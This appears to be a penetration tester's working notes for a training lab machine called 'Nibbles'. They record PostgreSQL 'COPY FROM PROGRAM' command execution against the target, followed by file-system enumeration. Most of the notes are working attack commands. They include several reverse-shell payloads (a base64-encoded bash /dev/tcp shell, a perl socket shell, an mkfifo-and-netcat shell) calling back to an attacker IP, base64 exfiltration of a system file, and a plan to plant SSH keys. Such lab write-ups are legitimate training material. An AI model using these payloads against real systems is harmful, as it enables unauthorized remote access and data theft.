# Nibbles Notes

## Data 

IP: 192.168.182.47
OS: Linux
Arch: Debian 10 Buster
Hostname: 
DNS:
Domain:  / Domain SID:
Machine Purpose: 
Services: 21, 22,80, 139, 445, 5437 (Postgresql)
Service Languages:
Users:
Email and Username Formatting:
Credentials:

## Objectives

`\#\# Target Map ![](Nibbles-map.excalidraw.md)`

#### Machine Connects to list and reason:

[[]] - Reason X

## Data Collected

#### Credentials
```
```

#### HUMINT


#### Solution Inventory Map

```sql
#PoC
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);

COPY cmd_exec FROM PROGRAM 'ls -la /home/wilson';
COPY cmd_exec FROM PROGRAM 'ls -la /home/wilson/ftp';
COPY cmd_exec FROM PROGRAM 'ls -la /';
COPY cmd_exec FROM PROGRAM 'ls -la /opt';

COPY cmd_exec FROM PROGRAM 'ls -la /srv';
COPY cmd_exec FROM PROGRAM 'ls -la /srv/ftp/';
COPY cmd_exec FROM PROGRAM 'ls -la /home'; -- No postgresql key
COPY cmd_exec FROM PROGRAM 'find / -type f -name page2.html 2>/dev/null';
COPY cmd_exec FROM PROGRAM 'ls -la /var/www';

COPY cmd_exec FROM PROGRAM 'ls -la /var/www/html';
COPY cmd_exec FROM PROGRAM 'ls -la /etc/apache2/sites-enabled/000-default.conf';
COPY cmd_exec FROM PROGRAM 'cat /etc/apache2/sites-enabled/000-default.conf'; -- breaks the postgresql

-- Perms!!  
-- Create a .ssh, id_rsa! 
COPY cmd_exec FROM PROGRAM 'mkdir /home/wilson/.ssh'; -- no permission to do so

COPY cmd_exec FROM PROGRAM 'echo VGVzdGluZyAxMjMK | base64 -d > /tmp/test.txt';
COPY cmd_exec FROM PROGRAM 'cat /tmp/test.txt';

COPY cmd_exec FROM PROGRAM 'which nohup';
-- /usr/bin/nohup

echo "nohup /dev/shm & "

COPY cmd_exec FROM PROGRAM 'which curl'; -- wget /usr/bin/wget

COPY cmd_exec FROM PROGRAM 'wget ';

-- Use UTF-16LE by mistake
COPY cmd_exec FROM PROGRAM 'echo LwBiAGkAbgAvAGIAYQBzAGgAIAAtAGkAIAA+ACYAIAAvAGQAZQB2AC8AdABjAHAALwAxADkAMgAuADEANgA4AC4ANAA1AC4AMQA5ADEALwA2ADkANgA5ACAAMAA+ACYAMQAKAA==
 | base64 -d > /dev/shm/bash-i.sh';
COPY cmd_exec FROM PROGRAM 'nohup /dev/shm/bash-i.sh &';

COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.45.191:8443");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';

-- does not work:
COPY cmd_exec FROM PROGRAM 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTkxLzk2OTYgMD4mMQo=
 | base64 -d | /bin/bash';


COPY cmd_exec FROM PROGRAM 'find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null';

-- Fails
COPY cmd_exec FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.191 9696 >/tmp/f';
-- Fails
COPY cmd_exec FROM PROGRAM 'echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNDUuMTkxLzE1MDAwIDA+JjE= | base64 -d | bash';

COPY cmd_exec FROM PROGRAM 'find . -type d -name *onf* 2>/dev/null | ls | xargs grep -rie ''passw''';


```

```
COPY files FROM PROGRAM ‘perl -MIO -e ‘’$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,”192.168.45.191:9696");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;’’’;
```

```sql
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.145.191:9696");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';;																					

SELECT * FROM cmd_exec;

-- Cant chmod 
-- 000-.conf

-- exfil with base64 worked!
COPY cmd_exec FROM PROGRAM 'cat /etc/hosts |base64 ';
```
#### Todo 

- read credentials from box
- write id_rsa, shell onto the box and use nohup to execute it so that it does not try to send stdout to the table


#### Timeline of tasks complete

- Automated Recon
- Searchsploited:
	- PostgreSQL
	- Apache has local PrivEsc - linux/local/46676.php
- Manual Web:
	- Need to Directory bust


[miguelaeh on Github Issue states:](https://github.com/bitnami/charts/issues/5150) *"The databases `template0` and `template1` are used to create new database when using the `CREATE DATABASE` command"*

There are no tables

[The default Postgres user is `postgres`](https://enterprisedb.com/postgres-tutorials/connecting-postgresql-using-psql-and-pgadmin) 